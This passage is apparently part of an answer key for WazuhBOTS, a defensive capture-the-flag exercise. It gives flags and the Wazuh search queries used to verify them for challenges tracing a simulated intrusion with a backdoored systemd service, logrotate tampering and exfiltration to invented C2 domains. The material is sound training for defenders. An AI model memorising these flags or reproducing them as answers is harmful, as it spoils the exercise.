| 29 | S4-ALP-09 | Exfil Chunk Naming Pattern | `chunk_NNNN.enc` | `data.chunk_name: *chunk*` → identify naming pattern |
| 30 | S4-ALP-10 | Logrotate Original Values | `rotate_7_maxage_30` | `syscheck.path: *logrotate*wazuh*` → read `data.logrotate.original_rotate` + `original_maxage` |
| 31 | S4-ALP-11 | Systemd Unit File Path | `/etc/systemd/system/svc_update.service` | `data.systemd.unit_file_path: *` → read full systemd unit path |
| 32 | S4-ALP-12 | Package SHA256 Hash | `c7a5b3d9e2f14680ab91cd3e4f567890123456789abcdef0123456789abcdef0` | `data.pip.package_hash: *` → read `data.pip.package_hash` |

### Fenrir (500 pts each)

| # | ID | Challenge | Flag | Verification Query |
|---|-----|-----------|------|-------------------|
| 33 | S4-FNR-01 | Multi-Host Correlation Timeline | `web-srv:2026-03-05T02:14:33Z\|dc-srv:2026-03-05T06:31:07Z\|lnx-srv:2026-03-05T08:45:22Z` | `data.command: *wazuhbots-utils*` → sort asc, first timestamp per `agent.name` |
| 34 | S4-FNR-02 | Exfiltration Endpoint and Volume | `https://cdn-static.cloud-metrics.net/api/v2/upload:847` | `data.url: *cdn-static.cloud-metrics.net/api/v2/upload*` → sum all `data.bytes_sent` → MB |
| 35 | S4-FNR-03 | Anti-Forensics Logrotate Manipulation | `/etc/logrotate.d/wazuh:rotate_0_maxage_1:web-srv,lnx-srv` | `syscheck.path: *logrotate*wazuh*` → values + `agent.name` terms agg |
| 36 | S4-FNR-04 | Complete Exfil Breakdown Per Host | `web-srv:312\|dc-srv:287\|lnx-srv:248` | `data.url: *cdn-static.cloud-metrics.net/api/v2/upload*` → sum `data.bytes_sent` per `agent.name` → MB |
| 37 | S4-FNR-05 | Infection Delay Pattern | `256\|134` | `data.command: *wazuhbots-utils*` → sort asc, calculate delays between host infections (min) |
| 38 | S4-FNR-06 | Anti-Forensics Host Scope | `lnx-srv\|web-srv` | `data.command: *logrotate* OR data.logrotate: *` → terms agg on `agent.name` |
| 39 | S4-FNR-07 | DNS Subdomain Encoding Length | `32` | `rule.id: 87950` → read `data.dns.subdomain_length` |
| 40 | S4-FNR-08 | Complete C2 Domain Family | `cdn-analytics.cloud-metrics.net\|cdn-static.cloud-metrics.net` | `full_log: *cloud-metrics.net*` → collect unique domains |
| 41 | S4-FNR-09 | Full MITRE Technique Chain | `T1041\|T1059.006\|T1070\|T1071.004\|T1074.001\|T1195.001\|T1543.002` | `(_index: wazuh-alerts-4.x-2026.03.05 OR _index: wazuh-alerts-4.x-2026.03.06) AND rule.mitre.id: *` → terms agg on `rule.mitre.id` |
| 42 | S4-FNR-10 | Backdoor MD5 Hash | `e99a18c428cb38d5f260853678922e03` | `syscheck.path: *svc_update.py*` → read `syscheck.md5_after` |

---

## Quick Reference: Points Summary

| Category | Count | Points Each | Subtotal |
|----------|-------|-------------|----------|
| Pup | 40 | 100 | 4,000 |
| Hunter | 40 | 200 | 8,000 |
| Alpha | 39 | 300 | 11,700 |
| Fenrir | 31 | 500 | 15,500 |
| **Total** | **150** | | **39,200** |

---

## Automated Verification

To verify all flags against the generated datasets:

```bash
# Verify all 150 flags
python3 scripts/verify_flags.py --all --verbose

# Verify a single scenario
python3 scripts/verify_flags.py --scenario 1 --verbose

# Expected output: 150 passed, 0 failed, 0 skipped
```

---

*Generated for WazuhBOTS v1.0 -- 150 challenges, 39,200 points*
*Author: MrHacker (Kevin Munoz) -- Wazuh Technology Ambassador*
